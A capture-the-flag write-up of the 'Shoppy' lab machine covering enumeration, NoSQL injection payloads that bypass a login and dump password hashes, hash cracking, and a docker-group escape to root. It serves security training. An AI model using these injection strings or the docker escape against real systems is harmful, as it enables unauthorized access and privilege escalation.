# easy - Shoppy

## User flag

Ports scanning:

```bash
» sudo nmap --open --min-rate 5000 -T4 -Pn -p- 10.129.227.233
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9093/tcp open  copycat
```

Scanning subdomains:

```bash
» gobuster vhost \
	-w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
	--append-domain -t 50 -u shoppy.htb
	
...
Found: mattermost.shoppy.htb Status: 200 [Size: 3122]
...
```

Scanning paths:

```bash
» wfuzz -c -z \
	file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
	--hc 404 "http://shoppy.htb/FUZZ/"
...
...
000000003:   302        0 L      4 W        28 Ch       "admin"
000000039:   200        25 L     62 W       1074 Ch     "login"
000000109:   302        0 L      4 W        28 Ch       "Admin"
000000160:   200        25 L     62 W       1074 Ch     "Login"
000000681:   302        0 L      4 W        28 Ch       "ADMIN"
000016032:   200        25 L     62 W       1074 Ch     "LOGIN"

```

Found this login page:

![image-20221202002040156](../../../images/articles/shoppy/image-20221202002040156.png)

By passed by injecting a nosqli: `admin' || '1==1%00`

![image-20221202002941291](../../../images/articles/shoppy/image-20221202002941291.png)

Inyecting a nosqli on the "Search for users" form: `http://shoppy.htb/admin/search-users?username=foo' || '1==1`

And the web response:

```json
[
  {
    "_id": "62db0e93d6d6a999a66ee67a",
    "username": "admin",
    "password": "23c6877d9e2b564ef8b32c3a23de27b2"
  },
  {
    "_id": "62db0e93d6d6a999a66ee67b",
    "username": "josh",
    "password": "6ebcea65320589ca4f2f1ce039975995"
  }
]
```

Cracking passwords:

```bash
» hashcat -m 0 -a 0 --show hashes.txt /usr/share/dict/rockyou.txt
6ebcea65320589ca4f2f1ce039975995:remembermethisway
```

Found a mattermost hosted page:

![image-20221202010352150](../../../images/articles/shoppy/image-20221202010352150.png)

Logging in with Josh creds:

![image-20221202010424771](../../../images/articles/shoppy/image-20221202010424771.png)

Got a shell:

```bash
» ssh jaeger@10.129.227.233
jaeger@10.129.227.233's password:
...
jaeger@shoppy:~$ id
uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)
```

## Root flag

Finding something to escalate:

```bash
jaeger@shoppy:~$ sudo -l
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
    
    
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: test
Access denied! This incident will be reported !
```

The binary itself contains a password:

```bash
jaeger@shoppy:~$ xxd /home/deploy/password-manager | grep -A 5 -i pass
00002020: 7061 7373 776f 7264 206d 616e 6167 6572  password manager
00002030: 2100 0000 0000 0000 506c 6561 7365 2065  !.......Please e
00002040: 6e74 6572 2079 6f75 7220 6d61 7374 6572  nter your master
00002050: 2070 6173 7377 6f72 643a 2000 0053 0061   password: ..S.a
00002060: 006d 0070 006c 0065 0000 0000 0000 0000  .m.p.l.e........
00002070: 4163 6365 7373 2067 7261 6e74 6564 2120  Access granted!
00002080: 4865 7265 2069 7320 6372 6564 7320 2100  Here is creds !.
00002090: 6361 7420 2f68 6f6d 652f 6465 706c 6f79  cat /home/deploy
000020a0: 2f63 7265 6473 2e74 7874 0000 0000 0000  /creds.txt......

jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!

jaeger@shoppy:~$ su deploy
Password:
$ bash
deploy@shoppy:/home/jaeger$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

Notice we are in the docker group:

```bash
deploy@shoppy:~$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
```

And thanks to https://gtfobins.github.io/gtfobins/docker/#shell :

```bash
deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# bash
root@571da5033eb9:/# ls ~/
root.txt
```

